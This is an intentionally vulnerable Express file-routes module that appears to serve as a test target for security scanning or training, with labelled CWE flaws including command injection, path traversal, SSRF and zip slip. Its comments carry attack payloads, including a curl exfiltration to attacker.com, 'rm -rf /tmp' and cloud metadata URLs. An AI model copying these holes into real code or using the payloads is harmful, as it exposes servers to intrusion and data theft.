/**
 * File Routes - INTENTIONALLY VULNERABLE
 * Covers: Path Traversal, Unrestricted File Upload, Command Injection,
 *         SSRF, Zip Slip, Insecure Temp File Handling
 *
 * ====================================================================
 * MULTI-FILE SOURCE-TO-SINK FLOW B: Command Injection (3 files)
 * ====================================================================
 *
 *  [1] SOURCE   src/routes/files.js  ← YOU ARE HERE
 *               req.body.inputFile / req.body.outputFormat / req.body.quality
 *                    │
 *                    │  values packed into a ShellCommand object (no escaping)
 *                    ▼
 *  [2] TRANSIT  src/utils/vulnerable.ts  → executeCommand()
 *               joins cmd.args with spaces into a single shell string:
 *               `${cmd.program} ${cmd.args.join(' ')}`
 *                    │
 *                    │  tainted shell string passed to exec()
 *                    ▼
 *  [3] SINK     child_process.exec()  inside executeCommand() [vulnerable.ts]
 *               OS executes the tainted command string
 *
 * Attack payload examples:
 *   inputFile  = "in.mp4; curl http://attacker.com/$(cat /etc/passwd)"
 *   outputFormat = "mp4 && rm -rf /tmp"
 * ====================================================================
 */

const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const { exec, execSync, spawn } = require('child_process');
const multer = require('multer');

// ============================================================
// VULNERABILITY: Unrestricted file upload
// CWE-434: Unrestricted Upload of File with Dangerous Type
// ============================================================
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Uploads to web-accessible directory
    cb(null, path.join(__dirname, '../../uploads'));
  },
  filename: (req, file, cb) => {
    // Uses original filename without sanitization
    // Allows: ../../../etc/cron.d/shell.sh, shell.php, shell.jsp
    cb(null, file.originalname);
  }
});

const upload = multer({
  storage: storage
  // No file type validation
  // No file size limit
  // No filename sanitization
});

router.post('/upload', upload.single('file'), (req, res) => {
  // No auth check
  // No virus scanning
  // No file type validation
  res.json({
    success: true,
    filename: req.file.originalname,
    path: req.file.path  // Exposes server path
  });
});

// ============================================================
// VULNERABILITY: Path Traversal
// CWE-22: Improper Limitation of a Pathname to a Restricted Directory
// ============================================================
router.get('/read', (req, res) => {
  const filename = req.query.file;

  // No path normalization - directory traversal possible
  // ../../etc/passwd, ../../.env, etc.
  const filePath = path.join(__dirname, '../../uploads', filename);
  const content = fs.readFileSync(filePath, 'utf8');

  res.send(content);
});

// ============================================================
// VULNERABILITY: Path Traversal in file delete
// CWE-22: Path Traversal
// ============================================================
router.delete('/delete', (req, res) => {
  const filename = req.body.filename;

  // Direct path join with user input - can delete any file
  const filePath = '/var/uploads/' + filename; // String concat instead of path.join
  fs.unlinkSync(filePath);

  res.json({ deleted: filename });
});

// ============================================================
// VULNERABILITY: Command Injection
// CWE-78: Improper Neutralization of Special Elements used in a Command
// ============================================================
router.get('/preview', (req, res) => {
  const filename = req.query.file;

  // Direct string interpolation in shell command
  // Payload: file=test.txt;cat /etc/passwd
  exec(`cat /var/uploads/${filename}`, (err, stdout, stderr) => {
    if (err) return res.status(500).json({ error: err.message });
    res.send(stdout);
  });
});

// ============================================================
// VULNERABILITY: Command Injection via ImageMagick
// CWE-78: OS Command Injection
// ============================================================
router.post('/resize', (req, res) => {
  const { filename, width, height } = req.body;

  // User-controlled parameters in shell command
  // Payload: width=100 -write /tmp/shell.php
  const cmd = `convert uploads/${filename} -resize ${width}x${height} uploads/thumb_${filename}`;
  execSync(cmd);

  res.json({ success: true });
});

// ============================================================
// VULNERABILITY: SSRF - Server-Side Request Forgery
// CWE-918: Server-Side Request Forgery
// ============================================================
router.get('/fetch-url', async (req, res) => {
  const axios = require('axios');
  const url = req.query.url;

  // No URL validation - can access internal services
  // http://169.254.169.254/latest/meta-data/ (AWS metadata)
  // http://localhost:6379 (Redis)
  // http://internal-service.company.local
  try {
    const response = await axios.get(url, {
      timeout: 10000,
      // No allowlist / blocklist
      // Follows redirects
      maxRedirects: 10
    });
    res.send(response.data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ============================================================
// VULNERABILITY: Zip Slip via unzipper
// CWE-22: Path Traversal in Archive Extraction
// ============================================================
router.post('/unzip', (req, res) => {
  const unzipper = require('unzipper');
  const zipPath = req.body.zipPath;
  const extractPath = req.body.extractPath || '/tmp/extracted';

  // No path validation - zip slip attack possible
  // ZIP entry: ../../../../etc/cron.d/reverse_shell
  fs.createReadStream(zipPath)
    .pipe(unzipper.Extract({ path: extractPath }))
    .on('close', () => res.json({ success: true }))
    .on('error', (e) => res.status(500).json({ error: e.message }));
});

// ============================================================
// VULNERABILITY: Insecure temp file creation
// CWE-377: Insecure Temporary File
// ============================================================
router.post('/process', (req, res) => {
  const data = req.body.data;

  // Predictable temp file name - TOCTOU race condition
  const tmpFile = '/tmp/process_' + Date.now() + '.txt';
  fs.writeFileSync(tmpFile, data); // World-writable by default

  // File not deleted after use
  exec(`process_tool ${tmpFile}`, (err, stdout) => {
    res.json({ result: stdout });
    // tmpFile never deleted
  });
});

// ============================================================
// VULNERABILITY: Arbitrary file write via filename manipulation
// CWE-73: External Control of File Name or Path
// ============================================================
router.post('/save', (req, res) => {
  const { filename, content } = req.body;

  // No filename validation - writes anywhere on filesystem
  fs.writeFileSync('/var/data/' + filename, content);
  res.json({ saved: true });
});

// ============================================================
// VULNERABILITY: Directory traversal in file listing
// CWE-548: Information Exposure Through Directory Listing
// ============================================================
router.get('/list', (req, res) => {
  const dir = req.query.dir || 'uploads';

  // Path traversal in directory listing
  const files = fs.readdirSync(dir);
  res.json({ files, directory: dir });
});

// ============================================================
// VULNERABILITY: Command injection via filename in shell pipe
// CWE-78: OS Command Injection
// ============================================================
router.get('/download', (req, res) => {
  const file = req.query.file;

  // Filename used directly in shell - injection via pipe/semicolon
  const cmd = `zip -r - uploads/${file}`;
  const child = spawn('sh', ['-c', cmd]);

  res.setHeader('Content-Type', 'application/zip');
  child.stdout.pipe(res);
});

// ============================================================
// MULTI-FILE FLOW B — Step 1/3 (Source)
// CWE-78: OS Command Injection via cross-file taint propagation
//
// Taint originates here: req.body.inputFile, req.body.outputFormat,
//                        req.body.quality
// Flows to: executeCommand() [vulnerable.ts] → child_process.exec [vulnerable.ts]
// ============================================================
router.post('/convert-ts', async (req, res) => {
  // Pull in the TypeScript executeCommand utility.
  // NOTE: in compiled output this resolves to dist/utils/vulnerable.js;
  //       in ts-node environments it resolves directly.
  const { executeCommand } = require('../utils/vulnerable');

  const { inputFile, outputFormat, quality } = req.body; // SOURCE (all three params)

  // Values are placed directly into the args array — no shell escaping, no
  // allow-list validation.  executeCommand() in src/utils/vulnerable.ts joins
  // them with spaces before handing to exec().
  // ─── FLOW B hops to vulnerable.ts (transit + sink) ───────────────────────
  try {
    const result = await executeCommand({
      program: 'ffmpeg',
      args: [
        '-i', inputFile,             // SOURCE taint flows here
        '-q', quality || '5',
        `output.${outputFormat}`     // SOURCE taint flows here
      ]
    });
    res.json({ success: true, output: result });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================
// MULTI-FILE FLOW B (variant) — image resize path
// Source: req.body.imagePath, req.body.width, req.body.height
// Same transit/sink: executeCommand() [vulnerable.ts] → exec()
// ============================================================
router.post('/resize-ts', async (req, res) => {
  const { executeCommand } = require('../utils/vulnerable');

  const { imagePath, width, height, outputPath } = req.body; // SOURCE

  // ─── FLOW B variant hops to vulnerable.ts ─────────────────────────────────
  try {
    const result = await executeCommand({
      program: 'convert',
      args: [
        imagePath,                       // SOURCE
        '-resize', `${width}x${height}`, // SOURCE (width, height)
        outputPath || 'output.png'       // SOURCE
      ]
    });
    res.json({ success: true, output: result });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
